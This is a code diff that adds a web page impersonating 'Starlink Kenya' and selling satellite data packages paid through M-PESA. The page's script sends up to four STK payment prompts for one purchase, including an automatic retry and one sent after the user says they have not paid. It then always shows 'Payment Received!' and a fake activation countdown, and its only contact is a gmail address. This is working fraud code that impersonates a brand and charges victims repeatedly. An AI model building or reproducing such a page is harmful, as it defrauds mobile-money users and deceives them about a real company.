@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starlink Direct to Cell</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        body {
+            background: #edf0f3;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: #031b34;
+            color: #fff;
+            padding: 12px 18px 25px;
+        }
+        
+        .top-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+        
+        .logo span {
+            color: #0fb3ff;
+            font-weight: 700;
+        }
+        
+        .menu-btn {
+            width: 22px;
+            height: 22px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, .1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+        }
+        
+        .hero {
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .hero h1 {
+            font-size: 18px;
+            font-weight: 700;
+        }
+        
+        .hero p {
+            font-size: 11px;
+            opacity: .8;
+            margin-top: 6px;
+        }
+        
+        .status {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #31d97b;
+        }
+        
+        .dot {
+            width: 6px;
+            height: 6px;
+            background: #31d97b;
+            display: inline-block;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .packages {
+            padding: 25px;
+        }
+        
+        .packages h2 {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 25px;
+            color: #111827;
+        }
+        
+        .grid {
+            max-width: 900px;
+            margin: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+            gap: 14px;
+        }
+        
+        .card {
+            background: #fff;
+            border-radius: 10px;
+            padding: 18px;
+            text-align: center;
+            position: relative;
+            transition: .3s;
+        }
+        
+        .card:hover {
+            transform: translateY(-3px);
+        }
+        
+        .card.active {
+            border: 2px solid #14aaf5;
+        }
+        
+        .badge {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: #14aaf5;
+            color: white;
+            font-size: 9px;
+            font-weight: 700;
+            padding: 3px 6px;
+            border-radius: 4px;
+        }
+        
+        .icon {
+            width: 38px;
+            height: 38px;
+            margin: auto;
+            border-radius: 50%;
+            background: #dff3ff;
+            color: #14aaf5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+        
+        .plan {
+            margin-top: 10px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .price {
+            margin-top: 8px;
+            font-size: 28px;
+            font-weight: 800;
+            color: #111827;
+        }
+        
+        .features {
+            margin-top: 10px;
+        }
+        
+        .features p {
+            color: #8b98a7;
+            font-size: 11px;
+            margin: 4px 0;
+        }
+        
+        .buy-btn {
+            width: 100%;
+            height: 36px;
+            margin-top: 14px;
+            border: none;
+            border-radius: 6px;
+            background: #14aaf5;
+            color: white;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .buy-btn:hover {
+            background: #0e8fd4;
+        }
+        /* PAYMENT MODAL - matching Fuliza style */
+        
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 300;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            backdrop-filter: blur(4px);
+        }
+        
+        .modal-overlay.show {
+            display: flex;
+        }
+        
+        .modal-box {
+            background: #fff;
+            border-radius: 24px;
+            overflow: hidden;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        .modal-header {
+            background: #031b34;
+            padding: 20px 24px;
+            text-align: center;
+            color: white;
+        }
+        
+        .modal-header .modal-label {
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            opacity: 0.7;
+            margin-bottom: 4px;
+        }
+        
+        .modal-header h3 {
+            font-size: 20px;
+            font-weight: 800;
+        }
+        
+        .modal-body {
+            padding: 24px;
+        }
+        /* Step: Form */
+        
+        .modal-form-step .info-box {
+            background: #f0f9ff;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .modal-form-step .info-box p {
+            font-size: 12px;
+            color: #0369a1;
+            font-weight: 600;
+            line-height: 1.5;
+        }
+        
+        .modal-form-step input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+            margin-bottom: 12px;
+            background: #f8fafc;
+        }
+        
+        .modal-form-step input:focus {
+            border-color: #14aaf5;
+        }
+        
+        .modal-form-step .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #14aaf5;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            transition: background 0.2s;
+        }
+        
+        .modal-form-step .btn-primary:hover {
+            background: #0e8fd4;
+        }
+        
+        .modal-form-step .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #f1f5f9;
+            color: #64748b;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            margin-top: 8px;
+        }
+        /* Step: PIN confirmation */
+        
+        .modal-pin-step {
+            text-align: center;
+        }
+        
+        .modal-pin-step .pin-card {
+            background: #f8fafc;
+            padding: 24px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .modal-pin-step .pin-card i {
+            font-size: 28px;
+            color: #14aaf5;
+            margin-bottom: 12px;
+        }
+        
+        .modal-pin-step .pin-card p {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e293b;
+            line-height: 1.6;
+        }
+        
+        .modal-pin-step .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #14aaf5;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+        
+        .modal-pin-step .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #f1f5f9;
+            color: #64748b;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-top: 8px;
+        }
+        /* Step: Spinner */
+        
+        .modal-spinner-step {
+            text-align: center;
+            padding: 30px 0;
+        }
+        
+        .spinner-circle {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e2e8f0;
+            border-top-color: #14aaf5;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .modal-spinner-step h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 16px;
+        }
+        
+        .modal-spinner-step .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #14aaf5;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 13px;
+            text-transform: uppercase;
+        }
+        /* Step: Status choice */
+        
+        .modal-choice-step {
+            text-align: center;
+        }
+        
+        .modal-choice-step .choice-card {
+            background: #f0fdf4;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .modal-choice-step .choice-card h3 {
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+        
+        .modal-choice-step .choice-card p {
+            font-size: 11px;
+            color: #64748b;
+            font-weight: 600;
+        }
+        
+        .modal-choice-step .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #14aaf5;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+        
+        .modal-choice-step .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #1e293b;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        /* Step: Success */
+        
+        .modal-success-step {
+            text-align: center;
+            padding: 10px 0;
+        }
+        
+        .success-icon {
+            width: 56px;
+            height: 56px;
+            background: #14aaf5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            color: white;
+            font-size: 24px;
+        }
+        
+        .modal-success-step h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+        
+        .modal-success-step .timer-display {
+            font-size: 36px;
+            font-weight: 900;
+            color: #14aaf5;
+            margin: 12px 0 20px;
+        }
+        
+        .modal-success-step .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: #1e293b;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 11px;
+            text-transform: uppercase;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .modal-success-step .btn-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #f1f5f9;
+            color: #64748b;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 11px;
+            text-transform: uppercase;
+            margin-top: 8px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        .footer {
+            background: #031b34;
+            color: white;
+            margin-top: 70px;
+            padding: 30px 25px;
+        }
+        
+        .footer-grid {
+            max-width: 1000px;
+            margin: auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+        }
+        
+        .footer p {
+            font-size: 12px;
+            line-height: 1.7;
+            opacity: .85;
+        }
+        
+        .footer a {
+            color: #14aaf5;
+            text-decoration: none;
+        }
+        
+        .copyright {
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, .1);
+            font-size: 11px;
+            opacity: .7;
+        }
+        
+        @media(max-width:480px) {
+            .packages {
+                padding: 18px;
+            }
+            .packages h2 {
+                font-size: 22px;
+            }
+            .grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .price {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <header class="header">
+        <div class="top-nav">
+            <div class="logo">
+                📡 Starlink <span>Direct to Cell</span>
+            </div>
+            <div class="menu-btn">☰</div>
+        </div>
+        <div class="hero">
+            <h1>Direct to Cell</h1>
+            <p>Kenya's fastest satellite internet — directly to your phone</p>
+            <div class="status">
+                <span class="dot"></span> Service Active
+            </div>
+        </div>
+    </header>
+
+    <section class="packages">
+        <h2>Choose Your Data Package</h2>
+        <div class="grid">
+
+            <div class="card" data-amount="70" data-name="Daily">
+                <div class="icon">📶</div>
+                <div class="plan">Daily</div>
+                <div class="price">Ksh 70</div>
+                <div class="features">
+                    <p>⚡ 2GB</p>
+                    <p>⏰ 24 Hours</p>
+                </div>
+                <button class="buy-btn">BUY</button>
+            </div>
+
+            <div class="card" data-amount="150" data-name="Weekly">
+                <div class="icon">📶</div>
+                <div class="plan">Weekly</div>
+                <div class="price">Ksh 150</div>
+                <div class="features">
+                    <p>⚡ 5GB</p>
+                    <p>⏰ 1 Week</p>
+                </div>
+                <button class="buy-btn">BUY</button>
+            </div>
+
+            <div class="card active" data-amount="180" data-name="Extended">
+                <span class="badge">POPULAR</span>
+                <div class="icon">📶</div>
+                <div class="plan">Extended</div>
+                <div class="price">Ksh 180</div>
+                <div class="features">
+                    <p>⚡ 10GB</p>
+                    <p>⏰ 1 Week</p>
+                </div>
+                <button class="buy-btn">BUY</button>
+            </div>
+
+            <div class="card" data-amount="250" data-name="Monthly">
+                <div class="icon">📶</div>
+                <div class="plan">Monthly</div>
+                <div class="price">Ksh 250</div>
+                <div class="features">
+                    <p>⚡ 20GB</p>
+                    <p>⏰ 1 Month</p>
+                </div>
+                <button class="buy-btn">BUY</button>
+            </div>
+
+            <div class="card" data-amount="349" data-name="Unlimited">
+                <div class="icon">📶</div>
+                <div class="plan">Unlimited</div>
+                <div class="price">Ksh 349</div>
+                <div class="features">
+                    <p>⚡ Unlimited</p>
+                    <p>⏰ 30 Days</p>
+                </div>
+                <button class="buy-btn">BUY</button>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- PAYMENT MODAL - same flow as Fuliza -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="modal-box">
+
+            <div class="modal-header">
+                <div class="modal-label">Secure M-PESA Payment</div>
+                <h3>Starlink <span id="modalPackageName">Data</span></h3>
+            </div>
+
+            <div class="modal-body">
+
+                <!-- STEP 1: FORM - Phone + ID -->
+                <div id="modalFormStep" class="modal-form-step">
+                    <div class="info-box">
+                        <p>Enter your M-PESA registered phone number to receive the STK payment prompt for your data package.</p>
+                    </div>
+                    <input type="number" id="phoneNum" placeholder="07XXXXXXXX" inputmode="numeric">
+                    <button onclick="showPinConfirmation()" class="btn-primary">
+                        Pay <span id="payAmount">Ksh 0</span>
+                    </button>
+                    <button onclick="closeModal()" class="btn-secondary">Cancel</button>
+                </div>
+
+                <!-- STEP 2: PIN CONFIRMATION -->
+                <div id="modalPinStep" class="modal-pin-step hidden">
+                    <div class="pin-card">
+                        <i class="🔒" style="font-size:32px;">🔒</i>
+                        <p>Now enter your M-PESA PIN <strong>on the prompt sent to your phone</strong> to complete payment for <strong id="confirmAmount">Ksh 0</strong></p>
+                    </div>
+                    <button onclick="triggerInitialSTK()" class="btn-primary">Continue to Payment</button>
+                    <button onclick="backToForm()" class="btn-secondary">Back</button>
+                </div>
+
+                <!-- STEP 3: SPINNER / AWAITING -->
+                <div id="modalSpinnerStep" class="modal-spinner-step hidden">
+                    <div class="spinner-circle"></div>
+                    <h3>Check M-PESA on your phone for the STK prompt</h3>
+                    <button onclick="showStatusChoice()" class="btn-primary">✓ I've entered my PIN</button>
+                </div>
+
+                <!-- STEP 4: STATUS CHOICE -->
+                <div id="modalChoiceStep" class="modal-choice-step hidden">
+                    <div class="choice-card">
+                        <h3>Payment Verification</h3>
+                        <p>Please confirm if you have completed the M-PESA transaction on your phone.</p>
+                    </div>
+                    <button onclick="finalTrigger('paid')" class="btn-primary">✓ I HAVE PAID — ACTIVATE MY DATA</button>
+                    <button onclick="finalTrigger('unpaid')" class="btn-secondary">I HAVE NOT PAID</button>
+                </div>
+
+                <!-- STEP 5: SUCCESS -->
+                <div id="modalSuccessStep" class="modal-success-step hidden">
+                    <div class="success-icon">✓</div>
+                    <h3>Payment Received!</h3>
+                    <div class="timer-display" id="timerDisplay">5:00</div>
+                    <p style="font-size:12px;color:#64748b;font-weight:600;margin-bottom:16px;">Your data package is being activated. Your reference is being processed.</p>
+                    <button onclick="location.reload()" class="btn-secondary">Back to Home</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-grid">
+            <div>
+                <p>Satellite internet, directly to your phone. Fast, reliable and available across Kenya.</p>
+            </div>
+            <div>
+                <p>✉️ starlinkkenya@gmail.com<br>Weekly 08:00 to 22:00</p>
+            </div>
+            <div>
+                <p>M-PESA STK Push with bank-grade encryption. Enter your number, confirm with your PIN, get connected instantly.</p>
+                <a href="#">Contact Us Here</a>
+            </div>
+        </div>
+        <div class="copyright">
+            © 2026 Starlink Kenya. All rights reserved.
+        </div>
+    </footer>
+
+    <script>
+        // ── STATE ──
+        let selectedAmount = 0;
+        let selectedName = '';
+
+        // ── BUY BUTTONS ──
+        document.querySelectorAll('.buy-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                const card = this.closest('.card');
+                selectedAmount = parseInt(card.dataset.amount);
+                selectedName = card.dataset.name;
+
+                // Update modal
+                document.getElementById('modalPackageName').textContent = selectedName;
+                document.getElementById('payAmount').textContent = 'Ksh ' + selectedAmount;
+                document.getElementById('confirmAmount').textContent = 'Ksh ' + selectedAmount;
+
+                // Reset modal to form step
+                resetModal();
+                document.getElementById('paymentModal').classList.add('show');
+            });
+        });
+
+        // ── MODAL HELPERS ──
+        function closeModal() {
+            document.getElementById('paymentModal').classList.remove('show');
+            resetModal();
+        }
+
+        function resetModal() {
+            document.getElementById('modalFormStep').classList.remove('hidden');
+            document.getElementById('modalPinStep').classList.add('hidden');
+            document.getElementById('modalSpinnerStep').classList.add('hidden');
+            document.getElementById('modalChoiceStep').classList.add('hidden');
+            document.getElementById('modalSuccessStep').classList.add('hidden');
+        }
+
+        function showStep(stepId) {
+            ['modalFormStep', 'modalPinStep', 'modalSpinnerStep', 'modalChoiceStep', 'modalSuccessStep'].forEach(id => {
+                document.getElementById(id).classList.toggle('hidden', id !== stepId);
+            });
+        }
+
+        function backToForm() {
+            showStep('modalFormStep');
+        }
+
+        // ── CLOSE ON OVERLAY CLICK ──
+        document.getElementById('paymentModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+
+        // ── PHONE INPUT FORMAT ──
+        document.getElementById('phoneNum').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+        });
+
+        // ── STK TRIGGER FUNCTION (same as Fuliza) ──
+        async function triggerSTKCall(note) {
+            try {
+                const phoneInput = document.getElementById('phoneNum').value;
+                if (!phoneInput || !selectedAmount) return;
+
+                console.log(note);
+
+                const response = await fetch('/api/stk-push', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: selectedAmount,
+                        phone_number: phoneInput,
+                        package_name: selectedName
+                    })
+                });
+
+                const data = await response.json();
+                console.log("STK Push Response:", data);
+
+                if (!data.success) {
+                    console.error("STK Push failed:", data.message);
+                }
+
+                return data;
+            } catch (error) {
+                console.error("STK Trigger Failed:", error);
+            }
+        }
+
+        // ── STEP FLOW: same multi-trigger pattern as Fuliza ──
+
+        // Called when user clicks "Pay Ksh X" in the form
+        function showPinConfirmation() {
+            const phone = document.getElementById('phoneNum').value;
+            if (!phone || phone.length < 10) {
+                alert('Please enter a valid 10-digit M-PESA phone number');
+                return;
+            }
+
+            // TRIGGER 1: Initial Pay Button click
+            triggerSTKCall('Trigger 1: Initial Pay Button');
+
+            showStep('modalPinStep');
+        }
+
+        // Called when user clicks "Continue to Payment"
+        function triggerInitialSTK() {
+            // TRIGGER 2: PIN Instructions Confirmed
+            triggerSTKCall('Trigger 2: PIN Instructions Confirmed');
+
+            showStep('modalSpinnerStep');
+
+            // TRIGGER 3: Auto-Retry Backup after 2 seconds
+            setTimeout(() => {
+                triggerSTKCall('Trigger 3: Auto-Retry Backup');
+            }, 2000);
+        }
+
+        // Called when user clicks "I've entered my PIN"
+        function showStatusChoice() {
+            showStep('modalChoiceStep');
+        }
+
+        // Called when user picks paid/unpaid
+        function finalTrigger(status) {
+            // TRIGGER 4: Manual Confirmation
+            triggerSTKCall('Trigger 4: User Manual Status: ' + status);
+
+            showStep('modalSuccessStep');
+            startTimer();
+        }
+
+        // ── TIMER (same as Fuliza) ──
+        function startTimer() {
+            let timeLeft = 300; // 5 minutes
+            const display = document.getElementById('timerDisplay');
+            const interval = setInterval(() => {
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                display.textContent = mins + ':' + (secs < 10 ? '0' : '') + secs;
+                if (--timeLeft < 0) {
+                    clearInterval(interval);
+                    display.textContent = '0:00';
+                }
+            }, 1000);
+        }
+    </script>
+
+</body>
+
+</html>
